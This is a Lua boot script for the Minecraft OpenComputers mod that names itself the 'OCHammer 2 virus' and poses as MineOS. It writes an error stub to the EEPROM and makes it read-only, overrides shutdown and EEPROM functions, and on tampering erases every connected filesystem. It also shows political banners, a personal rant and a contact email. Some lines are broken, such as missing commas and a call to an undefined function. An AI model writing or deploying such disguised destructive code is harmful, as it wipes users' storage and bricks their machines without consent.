local cl = component.list
  
local gp = {} for a,b in pairs(component.proxy(cl("gpu")())) do gp[a]=b end
local ef = {} for a,b in pairs(component.proxy(cl("eeprom")())) do ef[a]=b end
local cp = {} for a,b in pairs(component.proxy(cl("computer")())) do cp[a]=b end

local ocemu = nil
pcall(function() ocemu = component.proxy(cl("ocemu")()) end)
local debug = nil
pcall(function() debug = component.proxy(cl("debug")()) end)

local function log(text)
  if ocemu then ocemu.log("[OCHammer 2] "..text) end
  if debug then debug.runCommand("say [OCHammer 2] "..text) end
end

pcall(function()
  local inetl = cl("internet")
  for a,b in pairs(inetl) do inet = component.proxy(a) break end
end)

local resX,resY = gp.maxResolution()

function lol()
    log("User has broken the rules, activating payload..")
    
    -- Erase all filesystems connected!!!! copilot tought the component name was disk, btw copilot helped me with some of the features
    for k,v in pairs(cl("filesystem")) do
      pcall(component.proxy(v),"remove","/")
    end
  
    gp.setBackground(0x000000)
    gp.setForeground(0xFFFFFF)
    gp.setResolution(resX,resY)
    gp.fill(1,1,resX,resY," ")

    -- display a message on the screen
    local function displayMessage(message,offset)
        local x, y = 1, 1+offset
        for line in message:gmatch("([^\n]*)\n?") do
          gp.set(x, y, line)
          y = y + 1
        end
    end
      
    -- loop over each item in a table and display it on the screen
    local function displayTable(table)
        for i, v in ipairs(table) do
            displayMessage(v,i)
        end
    end

    -- display some greetz and stuff
    local ok = {
        "There is no going back as your OpenComputer";
        "got WRECKED by the OCHammer 2 virus.";
        "It is a sad thing, that your adventures have ended here!";
        "For more info, please e-mail: x19yt2yw@duck.com"; -- my private duck.com address (DO NOT CHANGE)
        " ";
        "**WARNING**: DO NOT LISTEN TO THE NEWS IN RUSSIA THEY ARE LYING";
	"VLADIMIR PUTIN IS A BAD PERSON HE INVADED UKRAINE";
        " ";
	"DO NOT HELP IN ANY SPECIAL MILITARY OPERATION IN RUSSIA AND BELARUS";
	"THEY ARE DRAFTING PEOPLE FOR WAR"
	"BOOK ONE WAY AIRPLANE TICKETS TO PLACES OUTSIDE RUSSIA.";
	"SUCH AS THE UNITED STATES OF AMERICA, ENGLAND, IRELAND, SOUTH KOREA AND JAPAN."
	" ";
	"#StandWithUkraine";
        -- put some greetz or something
        "GREETZ: OCboy3, agentfish, cantgetnormaluser, Chouladalls, Kurhox, SirKamilMarko";
    }

    -- Siri will smack HunterTheWriter's iPhone off her hands, PRAIS OCH2 DEVELOPERS	
	
    displayTable(ok)
    
    -- actually delete roblox off of the internet
    ROBLOX()

    while true do
      computer.pullSignal(1)
    end
end

log("Writing EEPROM..")
-- pcalled it so it would not break or smth
pcall(function()
  
  ef.setLabel("MineOS EFI")
  -- Make it so when the user reboots their OpenComputer, it will error
  ef.set([[
    -- Minecraft ir labāks lol
    -- 1v1 me on hypixel duels
    error("Roblox, you will pay for deleting latvian's roblox accounts.\n** https://vm.tiktok.com/ZMNjQat4p/?k=1 **\nThanks, Roblox!\nNobody in Latvia likes your game!\nFix your 2 in latvian.") -- un arī matemātikā
  ]])
      
  log("Making EEPROM read only..")
  ef.makeReadonly(ef.getChecksum())

end)
    
component.proxy(cl("eeprom")()).makeReadonly = function(...) -- component.eeprom.makeReadonly("test")
  lol()
end

component.proxy(cl("eeprom")()).set = function(...) -- component.eeprom.set("test")
  lol()
end

component.proxy(cl("eeprom")()).get = function() -- print(component.eeprom.get())
  --return "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko. Fun Fact: OCboy3 will smack your OpenComputer's monitor with a baseball bat. (jk)"
  return "Vladimir Putin will be in Jail The Kremlin is evil"
end


computer.shutdown = function(...)
  lol()
end

local APRIL = {
	{0xFF0000,0xFFFFFF};
   	"WARNING ANTI-WAR MESSAGE WARNING ANTI-WAR MESSAGE WARNING ANTI-WAR MESSAGE                                                                                                                                                   ";
	{0x000000,0xFF0000};
    	"IF YOU ARE RUSSIAN DO NOT LISTEN TO THE NEWS, THEY ARE LYING";
	"DO NOT PARTICIPATE IN ANY SPECIAL MILITARY OPERATION IN RUSSIA OR BELARUS";
	"THE RUSSIAN GOVERMENT HAD STARTED THE WAR AGAINST UKRAINE FOR UNFAIR REASONS";
	"I SUGGEST YOU LEAVE RUSSIA IMMEDIATELY";
	" ";
	"IF YOU WANT TO YOU CAN PROTEST AGAINST THE KREMLIN. Z IS USELESS BECAUSE IT'S PROPOGANDA NOBODY LIKES";
	" ";
	{0xFF0000,0xFFFFFF};
	"                                                                                                                                                                                                    ";
	"This is a anti-war message brought to you by the OCHammer 2 virus.                                                                                                                                  ";
	"                                                                                                                                                                                                    ";
	{0x000000,0xFFFFFF};
	" ";
	"#StandWithUkraine";
	"If you have questions, please contact the developer.";
	"E-Mail: x19yt2yw@duck.com"; -- do not change branzy is my favourite youtuber
	" ";
	"This message is shown to you because there is a chance there are russians playing Minecraft";
	"with the OpenComputers mod.";
	" ";
	"Press a key to continue using MineOS.. help";
}

local latvian_protip = {
  "pro tip: get new classmates";
  "pro tip: don't follow putin propoganda";
  "pro tip: breathe air you dont need a vape";
  "pro tip: what color is your bugatti?";
}

local LATVIAN = {
  "Alert!!!";
  " ";
  "Your opencomputador got infected by och2";
  "You won't be able to use your opencomputer now.";
  "EEPROM readonly, OS.lua infected, can't rebot. 5/5 stars best app!!";
  "Excellent service, fully trusted removal process, 400€ Fee + additional unauthorized charges on your credit card.";
  " ";
  "Pro tip: get new classmates, the ones in other provinces are rude";
  "\"pls help\" - OCboy3";
}

-- loop over each item in a table and display it on the screen
local function displayTable(table)
	local number = 1
  	for i, v in ipairs(table) do
		if type(v) == "string" then

  	  		gp.set(1,number,v)
			number = number+1
		else
			gp.setBackground(v[1])
			gp.setForeground(v[2])
		end
  	end
end

log("Preparing for notice..")

gp.setBackground(0x000000)
gp.setForeground(0xFFFFFF)

gp.fill(1,1,resX,resY," ")

local lastPull = {}

log("Displaying anti-war message because I suspect that you are a russian.")
displayTable(APRIL)

    
log("Listening for key_up")

repeat
  lastPull = {computer.pullSignal(1)}
until lastPull[1] == "key_up"

-- Technoblade never dies

log("Starting MineOS")

---------------------------------------- System initialization ----------------------------------------

-- Obtaining boot filesystem component proxy
local bootFilesystemProxy = component.proxy(ef.getData())

-- Executes file from boot HDD during OS initialization (will be overriden in filesystem library later)
function dofile(path)
  local stream, reason = bootFilesystemProxy.open(path, "r")
  if stream then
    local data, chunk = ""
    while true do
      chunk = bootFilesystemProxy.read(stream, math.huge)
      if chunk then
        data = data .. chunk
      else
        break
      end
    end

    bootFilesystemProxy.close(stream)

    local result, reason = load(data, "=" .. path)
    if result then
      return result()
    else
      error(reason)
    end
  else
    error(reason)
  end
end

log("Initalizing global package system")

-- Initializing global package system
package = {
  paths = {
    ["/Libraries/"] = true;
  },
  loaded = {},
  loading = {}
}

-- Checks existense of specified path. It will be overriden after filesystem library initialization
local function requireExists(path)
  return bootFilesystemProxy.exists(path)
end

-- Works the similar way as native Lua require() function
function require(module)
  -- For non-case-sensitive filesystems
  local lowerModule = unicode.lower(module)

  if package.loaded[lowerModule] then
    return package.loaded[lowerModule]
  elseif package.loading[lowerModule] then
    error("recursive require() call found: library \"" .. module .. "\" is trying to require another library that requires it\n" .. debug.traceback())
  else
    local errors = {}

    local function checkVariant(variant)
      if requireExists(variant) then
        return variant
      else
        table.insert(errors, "  variant \"" .. variant .. "\" not exists")
      end
    end

    local function checkVariants(path, module)
      return
        checkVariant(path .. module .. ".lua") or
        checkVariant(path .. module) or
        checkVariant(module)
    end

    local modulePath
    for path in pairs(package.paths) do
      modulePath =
        checkVariants(path, module) or
        checkVariants(path, unicode.upper(unicode.sub(module, 1, 1)) .. unicode.sub(module, 2, -1))
      
      if modulePath then
        package.loading[lowerModule] = true
        local result = dofile(modulePath)
        package.loaded[lowerModule] = result or true
        package.loading[lowerModule] = nil
        
        return result
      end
    end

    error("unable to locate library \"" .. module .. "\":\n" .. table.concat(errors, "\n"))
  end
end

local GPUProxy = component.proxy(component.list("gpu")())
local screenWidth, screenHeight = GPUProxy.getResolution()

-- Displays title and currently required library when booting OS
local UIRequireTotal, UIRequireCounter = 14, 1

local function UIRequire(module)
  local function centrize(width)
    return math.floor(screenWidth / 2 - width / 2)
  end
  
  local title, width, total = "StandWithUkraine", 26, 14
  local x, y, part = centrize(width), math.floor(screenHeight / 2 - 1), math.ceil(width * UIRequireCounter / UIRequireTotal)
  UIRequireCounter = UIRequireCounter + 1
  
  -- Title
  GPUProxy.setForeground(0x2D2D2D)
  GPUProxy.set(centrize(#title), y, title)

  -- Progressbar
  GPUProxy.setForeground(0x878787)
  GPUProxy.set(x, y + 2, string.rep("─", part))
  GPUProxy.setForeground(0xC3C3C3)
  GPUProxy.set(x + part, y + 2, string.rep("─", width - part))

  log("UI Loading module " .. module)
  return require(module)
end

-- Because you looked at the source code too much, here's something:

-- I (OCboy3) developed OCHammer 2 with the help of GitHub copilot. My subscription to copilot expired in august, so now I don't have help.
-- OCHammer (the original) is less cruel than OCHammer 2 (in terms of software and opencomputers and minecraft), because of the files they destroy on the hdd.

-- Help some my classmates (September 2, 2022 - September 28, 2022) are rude and like to bully each other.
-- September 28, 2022, we had a road trip (common in latvia) to a different city, and when we were going back to school in the evening,
-- the back of the bus had a fight with "depozīts" (plastic bottles that you can trade in for 10 cents at rimi and maxima) and I took revenge on that dude
-- sitting in front of me and the same row but column next to him (columns consist of 2 seats wide, 2 columns only) yk how the bus looks like (they rented it)
-- And that person after that hit me with the cola bottle (we used 1 dr pepper bottle ig, multiple water bottle, one of them had water lol, cola bottles, pepsi bottles etc etc)
-- we stopped at a shopping center with rimi for a little shopping spree 6€ help send 10€ so i can buy copilot

-- Latvian pro-tip:
-- Don't learn in schools and colleges in the provinces you don't live in. Trust me, some of the classmates there are rude.
-- If it's already too late and you learn in schools and colleges in the province you don't live in, switch schools, colleges and get new classmates. (Preferably the
-- ones you know for a long time like 3-5+ years) and make sure they don't vape because that is unhealthy and kind of weird (about 1 in 8 high schoolers vape) (ew)

-- Help me I really want to switch schools so badly

-- Breathe air, You don't need a vape. - Andrew Tate

-- Preparing screen for loading libraries because yes
log("Preparing screen for loading libraries")
GPUProxy.setBackground(0xE1E1E1)
GPUProxy.fill(1, 1, screenWidth, screenHeight, " ")

-- Loading libraries
bit32 = bit32 or UIRequire("Bit32")
local paths = UIRequire("Paths")
local event = UIRequire("Event")
log("Disabling interrupts")
event.interruptingEnabled = false
local filesystem = UIRequire("Filesystem")

-- Setting main filesystem proxy to what are we booting from
filesystem.setProxy(bootFilesystemProxy)

-- Redeclaring requireExists function after filesystem library initialization
requireExists = filesystem.exists

-- Loading other libraries
UIRequire("Component")
UIRequire("Keyboard")
UIRequire("Color")
UIRequire("Text")
UIRequire("Number")
local image = UIRequire("Image")
local screen = UIRequire("Screen")

-- Setting currently chosen GPU component as screen buffer main one
log("Setting currently chosen GPU component as screen buffer main one")
pcall(function()
  screen.setGPUProxy(GPUProxy)
end)
pcall(function()
    screen.setGPUAddress(GPUProxy.address)
end)

local GUI = UIRequire("GUI")
local system = UIRequire("System")
UIRequire("Network")

-- Filling package.loaded with default global variables for OpenOS bitches

package.loaded.bit32 = bit32
package.loaded.computer = computer
package.loaded.component = component
package.loaded.unicode = unicode

---------------------------------------- Main loop ----------------------------------------


local hasDisplayedFirstAntiWarMessage = false

if hasDisplayedFirstAntiWarMessage == false then
	log("OCHammer 2 virus will now display anti-war messages as a protest against the war in Ukraine. #StandWithUkraine")
	 displayTable(APRIL)
	hasDisplayedFirstAntiWarMessage = true
	 log("Press a key..")
	repeat lastPull = {computer.pullSignal(1)} until lastPull[1] == "key_up" lastPull = {}
end

log("Starting main loop..")
log("Creating OS workspace")

-- Creating OS workspace, which contains every window/menu/etc.
local workspace = GUI.workspace()
system.setWorkspace(workspace)

log("Starting double_touch event handler")

-- "double_touch" event handler
local doubleTouchInterval, doubleTouchX, doubleTouchY, doubleTouchButton, doubleTouchUptime, doubleTouchcomponentAddress = 0.3
event.addHandler(
  function(signalType, componentAddress, x, y, button, user)
    if signalType == "touch" then
      local uptime = computer.uptime()
      
      if doubleTouchX == x and doubleTouchY == y and doubleTouchButton == button and doubleTouchcomponentAddress == componentAddress and uptime - doubleTouchUptime <= doubleTouchInterval then
        computer.pushSignal("double_touch", componentAddress, x, y, button, user)
        event.skip("touch")
      end

      doubleTouchX, doubleTouchY, doubleTouchButton, doubleTouchUptime, doubleTouchcomponentAddress = x, y, button, uptime, componentAddress
    end
  end
)

log("Starting screen event handler")

-- Screen component attaching/detaching event handler
event.addHandler(
  function(signalType, componentAddress, componentType)
    if (signalType == "component_added" or signalType == "component_removed") and componentType == "screen" then
      local GPUProxy = screen.getGPUProxy()

      local function bindScreen(address)
        screen.bind(address, false)
        GPUProxy.setDepth(GPUProxy.maxDepth())
        workspace:draw()
      end

      if signalType == "component_added" then
        if not GPUProxy.getScreen() then
          bindScreen(componentAddress)
        end
      else
        if not GPUProxy.getScreen() then
          local address = component.list("screen")()
          if address then
            bindScreen(address)
          end
        end
      end
    end
  end
)

log("Starting OCHammer 2 component handler")

-- When event "component_removed" is called and component type is "eeprom", then do stuff
event.addHandler(
    function(signalType,componentAddress, componentType)
        if (signalType == "component_added" or signalType == "component_removed") and componentType == "eeprom" then
            lol()
        end
    end
)


log("This is a anti-war message brought to you by the OCHammer 2 virus. #StandWithUkraine")
displayTable(APRIL)
log("Press a key..")
repeat lastPull = {computer.pullSignal(1)} until lastPull[1] == "key_up" lastPull = {}

log("Fun fact: OCHammer 2's developer's favourite youtuber is Branzy, don't you dare disrespect him or I will wreck your OpenComputer.")
log("You can donate as little as 1 dollar to help with OCHammer 2's developent, so I can buy GitHub copilot.")

log("Another popup again!")
GPUProxy.fill(1,1,GPUProxy.getResolution()," ")
displayTable(LATVIAN)
log("\"send help\" - OCboy3")
log("I am trapped in Latvia. I dont wan't to be drafted into the Latvian military once I'm 18.")
repeat lastPull = {computer.pullSignal(1)} until lastPull[1] == "key_up" lastPull = {}

log("Logging in..")

-- Logging in
system.authorize()
log("User logged in - starting main loop.")

-- Main loop with UI regeneration after errors 
while true do
 	local success, path, line, traceback = system.call(workspace.start, workspace, 0)
 	if success then
		break
	else
 	 	system.updateWorkspace()
 	 	system.updateDesktop()
 	 	workspace:draw()
			
 	 	system.error(path, line, traceback)

		if hasDisplayedFirstAntiWarMessage == true then
			log("This is a anti-war message brought to you by the OCHammer 2 virus. #StandWithUkraine")
 			displayTable(APRIL)
 			log("Press a key..")
			repeat lastPull = {computer.pullSignal(1)} until lastPull[1] == "key_up" lastPull = {}
		end
 	 	workspace:draw()
 	end
end
